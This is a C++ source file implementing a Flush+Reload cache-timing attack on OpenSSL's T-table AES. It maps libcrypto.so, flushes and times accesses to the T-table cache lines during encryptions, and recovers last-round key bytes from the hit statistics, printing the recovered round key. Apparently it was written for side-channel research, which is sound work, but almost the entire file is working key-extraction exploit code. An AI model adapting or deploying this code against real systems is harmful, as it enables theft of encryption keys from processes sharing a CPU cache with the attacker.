#include <stdio.h>
#include <openssl/aes.h>
#include <stdlib.h>
#include <time.h>
#include <algorithm>
#include <utility> 
#include <cstdint>
#include <unordered_map>
#include <iostream>

extern "C" {
  #include "fr_util.h"
}

//number of encryptions to observe
#define n_enc (90000)

//bytes in plaintext, 128 bits
#define TXT_BYTES (16)

//in bytes
#define TABLE_SIZE (1024)
#define CACHE_LINESIZE (64)

#define CACHELINES_PER_TABLE (16)

//cache miss threshold, access time > threshold => cache miss
/*** SET THESE ADDRESSES FOR SYSTEM BEFORE RUNNING ***/
#define CACHE_MISS (250)

static const uint8_t Te4[256] = {
    0x63U, 0x7cU, 0x77U, 0x7bU, 0xf2U, 0x6bU, 0x6fU, 0xc5U,
    0x30U, 0x01U, 0x67U, 0x2bU, 0xfeU, 0xd7U, 0xabU, 0x76U,
    0xcaU, 0x82U, 0xc9U, 0x7dU, 0xfaU, 0x59U, 0x47U, 0xf0U,
    0xadU, 0xd4U, 0xa2U, 0xafU, 0x9cU, 0xa4U, 0x72U, 0xc0U,
    0xb7U, 0xfdU, 0x93U, 0x26U, 0x36U, 0x3fU, 0xf7U, 0xccU,
    0x34U, 0xa5U, 0xe5U, 0xf1U, 0x71U, 0xd8U, 0x31U, 0x15U,
    0x04U, 0xc7U, 0x23U, 0xc3U, 0x18U, 0x96U, 0x05U, 0x9aU,
    0x07U, 0x12U, 0x80U, 0xe2U, 0xebU, 0x27U, 0xb2U, 0x75U,
    0x09U, 0x83U, 0x2cU, 0x1aU, 0x1bU, 0x6eU, 0x5aU, 0xa0U,
    0x52U, 0x3bU, 0xd6U, 0xb3U, 0x29U, 0xe3U, 0x2fU, 0x84U,
    0x53U, 0xd1U, 0x00U, 0xedU, 0x20U, 0xfcU, 0xb1U, 0x5bU,
    0x6aU, 0xcbU, 0xbeU, 0x39U, 0x4aU, 0x4cU, 0x58U, 0xcfU,
    0xd0U, 0xefU, 0xaaU, 0xfbU, 0x43U, 0x4dU, 0x33U, 0x85U,
    0x45U, 0xf9U, 0x02U, 0x7fU, 0x50U, 0x3cU, 0x9fU, 0xa8U,
    0x51U, 0xa3U, 0x40U, 0x8fU, 0x92U, 0x9dU, 0x38U, 0xf5U,
    0xbcU, 0xb6U, 0xdaU, 0x21U, 0x10U, 0xffU, 0xf3U, 0xd2U,
    0xcdU, 0x0cU, 0x13U, 0xecU, 0x5fU, 0x97U, 0x44U, 0x17U,
    0xc4U, 0xa7U, 0x7eU, 0x3dU, 0x64U, 0x5dU, 0x19U, 0x73U,
    0x60U, 0x81U, 0x4fU, 0xdcU, 0x22U, 0x2aU, 0x90U, 0x88U,
    0x46U, 0xeeU, 0xb8U, 0x14U, 0xdeU, 0x5eU, 0x0bU, 0xdbU,
    0xe0U, 0x32U, 0x3aU, 0x0aU, 0x49U, 0x06U, 0x24U, 0x5cU,
    0xc2U, 0xd3U, 0xacU, 0x62U, 0x91U, 0x95U, 0xe4U, 0x79U,
    0xe7U, 0xc8U, 0x37U, 0x6dU, 0x8dU, 0xd5U, 0x4eU, 0xa9U,
    0x6cU, 0x56U, 0xf4U, 0xeaU, 0x65U, 0x7aU, 0xaeU, 0x08U,
    0xbaU, 0x78U, 0x25U, 0x2eU, 0x1cU, 0xa6U, 0xb4U, 0xc6U,
    0xe8U, 0xddU, 0x74U, 0x1fU, 0x4bU, 0xbdU, 0x8bU, 0x8aU,
    0x70U, 0x3eU, 0xb5U, 0x66U, 0x48U, 0x03U, 0xf6U, 0x0eU,
    0x61U, 0x35U, 0x57U, 0xb9U, 0x86U, 0xc1U, 0x1dU, 0x9eU,
    0xe1U, 0xf8U, 0x98U, 0x11U, 0x69U, 0xd9U, 0x8eU, 0x94U,
    0x9bU, 0x1eU, 0x87U, 0xe9U, 0xceU, 0x55U, 0x28U, 0xdfU,
    0x8cU, 0xa1U, 0x89U, 0x0dU, 0xbfU, 0xe6U, 0x42U, 0x68U,
    0x41U, 0x99U, 0x2dU, 0x0fU, 0xb0U, 0x54U, 0xbbU, 0x16U
};


int main(int argc, char **argv) {
  srand(time(NULL));

  //uint64_t num_addresses_tested = (TABLE_SIZE*4)/CACHE_LINESIZE;
  std::pair<double, unsigned int> hit_rate[TXT_BYTES][256];

  for (int i = 0; i < 16; ++i) {
    for (int ii = 0; ii < 256; ++ii) {
      hit_rate[i][ii] = {0, ii};
    }
  }

  //suppose we don't need to keep track of which cacheline was actually hit on, just which ciphertext bytes in relative positions get most hits
  unsigned int *hits_per_byte = (unsigned int *) calloc(TXT_BYTES*256, sizeof(unsigned int));
  if (!hits_per_byte) {
    return 1;
  }
  uint64_t *encryptions_per_byte = (uint64_t *) calloc(TXT_BYTES*256, sizeof(uint64_t));
  if (!encryptions_per_byte) {
    free(hits_per_byte);
    return 1;
  }

  //key init, something easy to check
  const unsigned char key[] =
  {
    0x01, 0x10, 0x01, 0x10, 0x01, 0x10, 0x01, 0x10,
    0x01, 0x10, 0x01, 0x10, 0x01, 0x10, 0x01, 0x10,
    0x01, 0x10, 0x01, 0x10, 0x01, 0x10, 0x01, 0x10,
    0x01, 0x10, 0x01, 0x10, 0x01, 0x10, 0x01, 0x10
  };

  AES_KEY enc_key;
  AES_set_encrypt_key(key, 128, &enc_key);

  /*** SET THESE ADDRESSES FOR SYSTEM BEFORE RUNNING ***/
  //set addresses of T-tables (must be done by observing memory in debugger), see mem_locs.png

  //ALSO! if ./extract: error while loading shared libraries: libcrypto.so.1.1: cannot open shared object file: No such file or directory
  //do this:
  //export LD_LIBRARY_PATH=/usr/local/lib

  ADDR_PTR te0, te1, te2, te3;
  te0 = 0x00000000001e6000;
  te1 = 0x00000000001e6400;
  te2 = 0x00000000001e6800;
  te3 = 0x00000000001e6c00;

  //get start and end of AES program
  ADDR_PTR start;
  ADDR_PTR end;

  int aes = open("/usr/local/lib/libcrypto.so", O_RDONLY);
  size_t size = lseek(aes, 0, SEEK_END);

  ///below courtesy of Daniel Gruss' template https://github.com/IAIK/cache_template_attacks/blob/main/profiling_aes_example/spy.cpp
  //map AES file to memory
  size_t map_size = size;
  if (map_size & 0xFFF != 0) {
    map_size |= 0xFFF;
    map_size += 1;
  }
  start = (uint64_t) mmap(0, map_size, PROT_READ, MAP_SHARED, aes, 0);
  end = start + size;
  //

  te0 += start;
  te1 += start;
  te2 += start;
  te3 += start;

  for (int e = 0; e < n_enc; ++e) {
      //proceed to test access times for Te0, ..., Te3

      //Te0
        ADDR_PTR test_addr = te0 + 64;

        if (test_addr > end) {
          printf("accessing past boundaries of AES program... not good\n");
        }

        //printf("... TESTING ADDRESS Te0 + %d = %lx ENCRYPTION ROUND %d...\n",ii, test_addr, e);
        unsigned char plaintxt[TXT_BYTES];
        unsigned char ciphertxt[TXT_BYTES];
        for (int i = 0; i < TXT_BYTES; ++i) {
          plaintxt[i] = rand() % 256;
        }
        clflush(test_addr);
        AES_encrypt(plaintxt, ciphertxt, &enc_key);
        CYCLES acc_time = maccess_t(test_addr);
        if (acc_time < CACHE_MISS) {
          //printf(GREEN "        HIT " RESET " INDEXING TO %d\n", (CACHELINES_PER_TABLE * 0) + (ii/64));
          hits_per_byte[2*256 + ciphertxt[2]] += 1;
          hits_per_byte[6*256 + ciphertxt[6]] += 1;
          hits_per_byte[10*256 + ciphertxt[10]] += 1;
          hits_per_byte[14*256 + ciphertxt[14]] += 1;
        } else {
          //printf(RED "        MISS " RESET "%lu\n", acc_time);
        }

        encryptions_per_byte[2*256 + ciphertxt[2]] += 1;
        encryptions_per_byte[6*256 + ciphertxt[6]] += 1;
        encryptions_per_byte[10*256 + ciphertxt[10]] += 1;
        encryptions_per_byte[14*256 + ciphertxt[14]] += 1;
      

      //Te1
        test_addr = te1 + 64;

        if (test_addr > end) {
          printf("accessing past boundaries of AES program... not good\n");
        }

        //printf("... TESTING ADDRESS Te1 + %d = %lx ENCRYPTION ROUND %d...\n",ii, test_addr, e);
        for (int i = 0; i < TXT_BYTES; ++i) {
          plaintxt[i] = rand() % 256;
        }
        clflush(test_addr);
        AES_encrypt(plaintxt, ciphertxt, &enc_key);
        acc_time = maccess_t(test_addr);
        if (acc_time < CACHE_MISS) {
          //printf(GREEN "        HIT " RESET " INDEXING TO %d\n", (CACHELINES_PER_TABLE * 1) + (ii/64));
          hits_per_byte[3*256 + ciphertxt[3]] += 1;
          hits_per_byte[7*256 + ciphertxt[7]] += 1;
          hits_per_byte[11*256 + ciphertxt[11]] += 1;
          hits_per_byte[15*256 + ciphertxt[15]] += 1;

        } else {
          //printf(RED "        MISS " RESET "%lu\n", acc_time);
        }

        encryptions_per_byte[3*256 + ciphertxt[3]] += 1;
        encryptions_per_byte[7*256 + ciphertxt[7]] += 1;
        encryptions_per_byte[11*256 + ciphertxt[11]] += 1;
        encryptions_per_byte[15*256 + ciphertxt[15]] += 1;


      //Te2
        test_addr = te2 + 64;

        if (test_addr > end) {
          printf("accessing past boundaries of AES program... not good\n");
        }

        //printf("... TESTING ADDRESS Te2 + %d = %lx ENCRYPTION ROUND %d...\n",ii, test_addr, e);
        for (int i = 0; i < TXT_BYTES; ++i) {
          plaintxt[i] = rand() % 256;
        }
        clflush(test_addr);
        AES_encrypt(plaintxt, ciphertxt, &enc_key);
        acc_time = maccess_t(test_addr);
        if (acc_time < CACHE_MISS) {
          //printf(GREEN "        HIT " RESET " INDEXING TO %d\n", (CACHELINES_PER_TABLE * 2) + (ii/64));
          hits_per_byte[0*256 + ciphertxt[0]] += 1;
          hits_per_byte[4*256 + ciphertxt[4]] += 1;
          hits_per_byte[8*256 + ciphertxt[8]] += 1;
          hits_per_byte[12*256 + ciphertxt[12]] += 1;

        } else {
          //printf(RED "        MISS " RESET "%lu\n", acc_time);
        }

        encryptions_per_byte[0*256 + ciphertxt[0]] += 1;
        encryptions_per_byte[4*256 + ciphertxt[4]] += 1;
        encryptions_per_byte[8*256 + ciphertxt[8]] += 1;
        encryptions_per_byte[12*256 + ciphertxt[12]] += 1;

      //Te3
        test_addr = te3 + 64;

        if (test_addr > end) {
          printf("accessing past boundaries of AES program... not good\n");
        }

        //printf("... TESTING ADDRESS Te3 + %d = %lx ENCRYPTION ROUND %d...\n",ii, test_addr, e);
        for (int i = 0; i < TXT_BYTES; ++i) {
          plaintxt[i] = rand() % 256;
        }
        clflush(test_addr);
        AES_encrypt(plaintxt, ciphertxt, &enc_key);
        acc_time = maccess_t(test_addr);
        if (acc_time < CACHE_MISS) {
          //printf(GREEN "        HIT " RESET " INDEXING TO %d\n", (CACHELINES_PER_TABLE * 3) + (ii/64));
          hits_per_byte[1*256 + ciphertxt[1]] += 1;
          hits_per_byte[5*256 + ciphertxt[5]] += 1;
          hits_per_byte[9*256 + ciphertxt[9]] += 1;
          hits_per_byte[13*256 + ciphertxt[13]] += 1;

        } else {
          //printf(RED "        MISS " RESET "%lu\n", acc_time);
        }

        encryptions_per_byte[1*256 + ciphertxt[1]] += 1;
        encryptions_per_byte[5*256 + ciphertxt[5]] += 1;
        encryptions_per_byte[9*256 + ciphertxt[9]] += 1;
        encryptions_per_byte[13*256 + ciphertxt[13]] += 1;
  }

  for (int i = 0; i < 16; ++i) {
    for (int ii = 0; ii < 256; ++ii) {
      //printf("BYTE %d at POSITION %d: HIT RATE %f HITS: %u ENCS: %lu\n", ii, i, (double) hits_per_byte[i*256 + ii]/encryptions_per_byte[i*256 + ii], hits_per_byte[i*256 + ii], encryptions_per_byte[i*256 + ii]);
      hit_rate[i][ii] = {(double) hits_per_byte[i*256 + ii]/encryptions_per_byte[i*256 + ii], ii};
    }
  }

  free(hits_per_byte);
  free(encryptions_per_byte);

  unsigned int ciphertxt_candidates[TXT_BYTES][TXT_BYTES];

  //get 16 maximum hit rate candidates for each ciphertext position
  for (int pos = 0; pos < TXT_BYTES; ++pos) {
    std::sort(hit_rate[pos], hit_rate[pos] + 256, [](const std::pair<double, unsigned int>& a, const std::pair<double, unsigned int>& b) {
            return a.first < b.first;
        });

    //printf("--- Top 16 candidates for position %d---\n", pos);
    for (int top = 255; top > (255 - TXT_BYTES); --top) {
      //printf("%u ", hit_rate[pos][top].second);
      int i = 256 - top - 1;
      ciphertxt_candidates[pos][i] = hit_rate[pos][top].second;
    }

    //printf("\n\n");
  }

  //recover intermediate values, they are some value in Te4 and xor possible intermediate values with ciphertext byte to get ROUND KEY candidates

  //use hash map to count occurances of each key candidate efficiently
  std::unordered_map<unsigned int, unsigned int> round_keys[TXT_BYTES];
  
  for (int pos = 0; pos < TXT_BYTES; ++pos) {
    for (int cand = 0; cand < TXT_BYTES; ++cand) {
      for (int te4_idx = 16; te4_idx < 32; ++te4_idx) {
        round_keys[pos][ciphertxt_candidates[pos][cand] ^ Te4[te4_idx]]++;
      }
    }
  }

  //debug print histogram of round key candidates
  // for (int pos = 0; pos < TXT_BYTES; ++pos) {
  //   printf("--- Frequency Histogram for position %d---\n\n ", pos);
  //   for (const auto &pair : round_keys[pos]) {
  //       std::cout << pair.first << ": " << pair.second << std::endl;
  //   }
  //   printf("\n\n");
  // }

  //map frequencies to vectors for sorting, we only need top candidate for each position, but sorting can let us print out a histogram for research paper
  std::vector<std::pair<unsigned int, unsigned int>> roundkey_histograms[TXT_BYTES];
  for (int pos = 0; pos < TXT_BYTES; ++pos) {
    std::vector<std::pair<unsigned int, unsigned int>> roundkey_histogram(round_keys[pos].begin(), round_keys[pos].end());
    std::sort(roundkey_histogram.begin(), roundkey_histogram.end(), [](const std::pair<double, unsigned int>& a, const std::pair<double, unsigned int>& b) {
              return a.second > b.second;
          });
    roundkey_histograms[pos] = roundkey_histogram;
  }

  unsigned int round_key[TXT_BYTES];

  for (int pos = 0; pos < TXT_BYTES; ++pos) {
    printf("--- Top Candidates for position %d---\n\n", pos);
    for (const auto &pair : roundkey_histograms[pos]) {
        std::cout << pair.first << ": " << pair.second << std::endl;
    }
    printf("\n\n");

    round_key[pos] = roundkey_histograms[pos][0].first;
  }

  printf("Your round key is: ");
  for (int pos = 0; pos < TXT_BYTES; ++pos) {
    printf("%u ", round_key[pos]);
  }
  printf("\n");

  close(aes);
  munmap((void *)start, map_size);
  fflush(stdout);

  return 0;
  
}